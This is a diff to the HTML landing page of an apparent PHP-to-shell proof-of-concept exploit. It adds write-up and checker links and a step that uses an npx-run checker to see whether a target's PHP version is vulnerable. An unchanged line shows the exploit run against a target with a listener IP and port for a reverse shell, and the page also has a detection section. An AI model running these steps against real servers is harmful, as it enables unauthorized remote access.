@@ -84,6 +84,8 @@
   <div class="btns">
     <a class="btn p" href="https://github.com/Whackermelon/Php2Shell-POC">★ Star on GitHub</a>
     <a class="btn" href="https://github.com/Whackermelon/Php2Shell-POC">Source &amp; documentation</a>
+    <a class="btn" href="https://whackermelon.com/projets/php2shell-poc/">✍️ Full write-up</a>
+    <a class="btn" href="https://github.com/openai/php2shell-checker">🩺 Check if a target is vulnerable</a>
     <a class="btn" href="https://github.com/Whackermelon/Php2Shell-POC/issues">Report an issue</a>
   </div>
 </header>
@@ -160,6 +162,18 @@ python3 php2shell.py https://target.example.com/index.php -l 10.0.0.5 -p 4444</c
        returns FAILURE.</p>
   </div>
 </div>
+
+<h2>Check a target first</h2>
+<p>Before running anything, check whether the target still serves a vulnerable PHP.
+   The <a href="https://github.com/openai/php2shell-checker">OpenAI php2shell-checker</a>
+   does exactly that, from the version alone:</p>
+<pre><code>npx phpcheck.js https://target.example.com
+# VULNERABLE  the PHP version is at or below the patched version of its branch
+# OK          the PHP version is patched — this chain will not work
+# UNKNOWN     the version could not be determined</code></pre>
+<p>The checker only looks at the version, so it says nothing about the
+   <code>session.upload_progress</code> configuration. The PoC reports that part itself
+   (<code>session fixation accepted by the target</code>, <code>no include() sink detected</code>, …).</p>
 
 <h2>Detection</h2>
 <p>Alert when a PHP worker process (<code>php-fpm</code>, <code>php-cgi</code>,
